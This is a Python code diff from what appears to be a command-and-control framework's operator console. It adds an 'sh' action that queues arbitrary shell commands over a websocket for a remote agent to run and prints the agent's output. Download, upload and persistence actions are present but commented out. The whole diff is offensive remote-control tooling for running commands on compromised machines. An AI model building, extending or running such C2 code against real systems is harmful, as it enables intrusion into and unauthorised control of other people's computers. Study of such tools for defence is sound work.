@@ -116,14 +116,42 @@ async def use_agent(websocket, agent_id):
         elif action == "clear":
             clear()
             continue
+
         elif action == "sh":
-            await useMode_wsCom(websocket,shell_cmd,agent_id)
-        elif action == "download":
-            await useMode_wsCom(websocket,shell_cmd,agent_id)
-        elif action == "upload":
-            await useMode_wsCom(websocket,shell_cmd,agent_id)
-        elif action == "percistance":
-            await useMode_wsCom(websocket,shell_cmd,agent_id)
+                if len(parts) < 2:
+                    print(f"[{RED}-{RESET}] Error: specify command (es. sh ls)")
+                    continue
+                
+                sh_cmd = " ".join(parts[1:])
+                #send cmd to server
+                await useMode_wsCom(websocket, "queue_task", agent_id, sh_cmd)
+                
+                ## blocking output NEED TO CHANGE THIS
+                print(f"{BLUE}[*] Waiting for output...{RESET}")
+                try:
+                    response_raw = await asyncio.wait_for(websocket.recv(), timeout=5.0)
+                    response = json.loads(response_raw)
+                    
+                    if response.get("type") == "agent_output":
+                        print(f"\n{response.get('output')}\n")
+                    else:
+                        print(f"\n[Response] -> {response}\n")
+                except asyncio.TimeoutError:
+                    print(f"\n{RED}[!] Timeout: agent did not reply within 5 seconds.{RESET}\n")
+                continue
+
+        # elif action == "download":
+        #
+        #     await useMode_wsCom(websocket,action,agent_id)
+        #     continue
+        #
+        # elif action == "upload":
+        #     await useMode_wsCom(websocket,action,agent_id)
+        #     continue
+        #
+        # elif action == "percistance":
+        #     await useMode_wsCom(websocket,action,agent_id)
+        #     continue
 
         else:
             command_not_fount()
@@ -132,35 +160,20 @@ async def use_agent(websocket, agent_id):
 
 
 
-async def useMode_wsCom(websocket,shell_cmd,agent_id):
-    # Per i comandi operativi, inviamo l'azione corretta al server FastAPI
-        # Mappiamo il comando inserito nel payload "queue_task"
-        payload = {
-            "action": "queue_task",
-            "agent_id": agent_id,
-            "data": shell_cmd
-        }
-        
-        await websocket.send(json.dumps(payload))
-        response_raw = await websocket.recv()
-        response = json.loads(response_raw)
-        
-        print(f"\n[Server Response] -> {response.get('output')}\n")
+async def useMode_wsCom(websocket, action, agent_id, data):
+    # task queue
+    payload = {
+        "action": "queue_task",
+        "agent_id": agent_id,
+        "data": data
+    }
+    
+    await websocket.send(json.dumps(payload))
+    response_raw = await websocket.recv()
+    response = json.loads(response_raw)
+    
+    print(f"\n[Server Response] :\n{response.get('output')}\n")
 
-
-
-# async def serverMode_wsCom( websocket, cmd):
-#     payload = {
-#             "action": "run_command",
-#             "data": cmd
-#             }
-#
-#     # Invia il messaggio come JSON
-#     await websocket.send(json.dumps(payload))
-#
-#     # Attende e riceve la risposta dal server
-#     response_raw = await websocket.recv()
-#     response = json.loads(response_raw)
 
 
 async def main(server_url):
